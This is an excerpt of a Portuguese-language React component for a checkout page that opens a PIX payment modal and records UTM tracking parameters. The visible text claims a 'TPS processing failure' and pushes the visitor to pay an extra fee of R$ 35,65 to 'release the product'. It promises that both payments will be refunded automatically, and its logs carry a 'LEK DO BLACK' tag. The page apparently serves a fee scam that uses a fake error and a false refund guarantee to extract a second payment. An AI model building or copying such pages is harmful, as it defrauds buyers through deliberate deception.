...
// Declaração TypeScript para window.ReactApp
declare global {
  interface Window {
    ReactApp?: {
      openPixModal: (utms?: Record<string, string>) => void;
    };
  }
}
...
const Index = () => {
  ...
  useEffect(() => {
    ...
    const checkOpenPix = () => {
      ...
      if (urlParams.get('openPix') === 'true') {
        setIsPixModalOpen(true);
        console.log('LEK DO BLACK: Modal PIX aberto via URL');
        // Remove o parâmetro da URL após abrir o modal
        urlParams.delete('openPix');
    ...
    // Escuta mudanças na URL (para quando vem do HTML estático)
    ...
    // Expõe função global para HTML estático
    window.ReactApp = {
      openPixModal: (utms?: Record<string, string>) => {
        console.log('LEK DO BLACK: Abrindo modal PIX via React com UTMs:', utms);
        setIsPixModalOpen(true);
      }
    };
  ...
  const handlePayClick = () => {
    ...
    const captureUtms = () => {
      ...
      console.log('LEK DO BLACK: UTMs capturadas:', utms);
      return utms;
    };
  ...
  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <div className="w-full bg-primary py-4 px-4 flex items-center justify-center">
        <svg xmlns="http://www.w3.org/2000/svg" width="140" height="32" viewBox="0 0 160 37" fill="none" className="sm:w-[160px] sm:h-[37px]">
          ...
          <div className="p-5 space-y-5">
            ...
            <div className="bg-red-50 rounded-lg p-4">
              <div className="flex items-center gap-3">
                ...
                <span className="text-red-800 font-semibold text-base">Falha no Processamento da TPS</span>
              </div>
            </div>
            ...
            <Button 
              ...
              className="w-full text-lg font-bold py-6 px-4 rounded-lg min-h-[56px]"
              size="lg"
            >
              Pagar Taxa e Liberar Produto
            </Button>
            ...
            <div className="bg-gray-50 rounded-lg p-5">
              <div className="flex items-center gap-3 mb-4">
                ...
                <h3 className="text-xl font-bold text-primary m-0">Garantia de Reembolso Total</h3>
              </div>
              
              <p className="text-base text-gray-700 text-center mb-5 leading-relaxed">
                Entendemos sua preocupação com o pagamento adicional. Por isso, garantimos que ambos os valores serão 100% reembolsados automaticamente assim que o pagamento for confirmado.
              </p>
              
              <div className="bg-white rounded-lg p-5">
                <div className="text-center">
                  <div className="text-primary text-xl font-bold mb-2">Pagamento anterior: R$ 35,65</div>
                  <div className="text-primary text-xl font-bold mb-4">Novo pagamento: R$ 35,65</div>
                  <hr className="border-gray-300 mb-4"/>
                  <div className="text-primary text-lg mb-2">Total a ser reembolsado:</div>
                  <div className="text-primary text-3xl font-bold">R$ 71,30</div>
                </div>
              </div>
            </div>
